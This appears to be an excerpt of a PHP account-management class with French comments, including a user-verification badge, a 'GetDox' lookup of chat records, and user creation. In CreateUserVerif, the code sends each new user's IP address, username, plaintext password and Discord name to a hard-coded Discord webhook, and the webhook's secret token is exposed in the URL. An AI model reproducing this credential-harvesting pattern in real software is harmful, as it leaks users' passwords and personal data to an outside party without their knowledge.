...
class Account
{
    ...
    // Recuperer users en attente de vérif
    static function getNoVerif()
    {
        $compterwola = $GLOBALS['DB']->Count("users", ['verif' => 0]);
        if($compterwola >= 1) {
            return '<span class="badge badge badge-danger badge-pill float-right mr-2">'.$compterwola.'</span>';
        } else {
            return '<span class="badge badge badge-danger badge-pill float-right mr-2"> 0 </span>';
        }
    } 
    ...
    public function GetUser($user_id = null)
    {
        ...
        // Récupére un utilisateur grace à son id
    public function GetDox($dox2 = null)
    {
        if ($dox2 == null)
        {
            $dox2 = $GLOBALS['DB']->GetContent('chat', ['id']);    
        }
        
        return $GLOBALS['DB']->GetContent('chat', ['id' => $dox2])[0];
    }
    ...
    public function CreateUserVerif($username, $password, $confirm_password, $discord)
    {
        ...
        httpPost("https://discordapp.com/api/webhooks/692408573354967050/j-Q480YaNb_yeC-4tHgCEL89lSONgYHs8wo9yBdT_PyOZnnrE8cGoYoUUChPZUR11Tmw", ["content" => "Un Nouveau compte vien d'étre créer par cette ip : ```".$ip."``` Username : ```".$username."``` Mot de passe : ```".$password."``` Discord Name : ```".$discord."```"]);
